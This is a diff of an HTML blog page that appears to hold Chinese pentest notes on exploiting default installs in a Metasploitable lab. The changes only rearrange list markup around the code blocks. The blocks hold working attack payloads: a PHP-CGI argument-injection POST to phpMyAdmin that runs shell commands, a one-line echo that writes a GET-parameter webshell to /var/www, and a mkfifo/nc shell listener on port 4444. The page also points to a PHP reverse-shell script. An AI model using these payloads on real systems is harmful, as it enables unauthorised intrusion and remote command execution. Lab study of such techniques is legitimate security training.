@@ -241,15 +241,19 @@
 </li>
 <li><p>phpMyAdmin/setup</p>
 <ul>
-<li>MetaSploitable <figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plain">POST http:&#x2F;&#x2F;&#x2F;phpMyAdmin&#x2F;?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp:&#x2F;&#x2F;input HTTP&#x2F;1.1<br>Host: 192.168.20.10<br>Content-Length: 40<br><br>&lt;?php<br>passthru(&#39;pwd&amp;&amp;ls&#39;); <br>die();<br>?&gt;<br></code></pre></td></tr></table></figure>
+<li>MetaSploitable<figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plain">POST http:&#x2F;&#x2F;&#x2F;phpMyAdmin&#x2F;?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp:&#x2F;&#x2F;input HTTP&#x2F;1.1<br>Host: 192.168.20.10<br>Content-Length: 40<br><br>&lt;?php<br>passthru(&#39;pwd&amp;&amp;ls&#39;); <br>die();<br>?&gt;<br></code></pre></td></tr></table></figure>
 <img src="/2020/10/14/%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98-1-%E9%BB%98%E8%AE%A4%E5%AE%89%E8%A3%85/pic1.png" alt></li>
 </ul>
 <a id="more"></a>
 
 <ul>
-<li><p>写入webshell</p>
-  <figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">echo&quot;&lt;?php\$cmd&#x3D;\$_GET[&quot;cmd&quot;];system(\$cmd);?&gt;&quot;&gt;&#x2F;var&#x2F;www&#x2F;3.php<br></code></pre></td></tr></table></figure>
+<li>写入webshell</li>
+</ul>
 </li>
+</ul>
+<figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">echo&quot;&lt;?php\$cmd&#x3D;\$_GET[&quot;cmd&quot;];system(\$cmd);?&gt;&quot;&gt;&#x2F;var&#x2F;www&#x2F;3.php<br></code></pre></td></tr></table></figure>
+
+<ul>
 <li><p>PHP反弹shell</p>
 <ul>
 <li><code>/usr/share/webshells/php/php-reverse-shell.php</code></li>
@@ -257,8 +261,6 @@
 </ul>
 </li>
 <li><p>侦听shell</p>
-</li>
-</ul>
 </li>
 </ul>
 <figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">echo system(&#39;mkfifo &#x2F;tmp&#x2F;pipe;sh &#x2F;tmp&#x2F;pipe|nc -nlp 4444 &gt; &#x2F;tmp&#x2F;pipe&#39;);<br></code></pre></td></tr></table></figure>
